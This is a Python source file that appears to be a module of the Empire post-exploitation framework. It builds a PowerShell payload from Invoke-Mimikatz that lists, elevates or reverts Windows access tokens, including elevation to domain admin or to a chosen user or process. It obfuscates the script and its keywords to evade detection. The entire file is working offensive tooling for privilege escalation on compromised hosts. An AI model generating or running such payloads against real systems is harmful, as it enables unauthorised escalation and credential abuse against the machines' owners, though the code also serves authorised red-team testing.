from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        list_tokens = params['list']
        elevate = params['elevate']
        revert = params['revert']
        admin = params['admin']
        domainadmin = params['domainadmin']
        user = params['user']
        processid = params['id']

        script = module_code

        script_end = "Invoke-Mimikatz -Command "

        if revert.lower() == "true":
            script_end += "'\"token::revert"
        else:
            if list_tokens.lower() == "true":
                script_end += "'\"token::list"
            elif elevate.lower() == "true":
                script_end += "'\"token::elevate"
            else:
                print(helpers.color("[!] list, elevate, or revert must be specified!"))
                return ""

            if domainadmin.lower() == "true":
                script_end += " /domainadmin"
            elif admin.lower() == "true":
                script_end += " /admin"
            elif user.lower() != "":
                script_end += " /user:" + str(user)
            elif processid.lower() != "":
                script_end += " /id:" + str(processid)

        script_end += "\"';"
        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
